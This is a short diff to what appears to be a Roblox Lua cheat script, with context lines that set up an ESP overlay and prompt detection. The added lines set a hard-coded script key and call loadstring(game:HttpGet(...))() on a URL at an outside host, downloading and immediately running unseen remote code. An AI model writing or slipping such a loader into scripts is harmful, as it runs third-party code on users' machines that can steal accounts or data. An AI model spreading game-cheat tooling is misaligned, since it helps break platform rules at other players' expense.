@@ -438,3 +438,7 @@ end
 createBaseESP()
 CONFIG.ENABLED=true enablePromptDetection()
 player.CharacterAdded:Connect(function() task.wait(0.5) enablePromptDetection() end)
+
+script_key = "ojyhc9yaw2hkkmv5dir4cf2l"
+
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/a930b4406bc0d05140ba2a1391bc01e5b6f7232b1192104ca8edbbd3aeb2ba4b.lua"))()
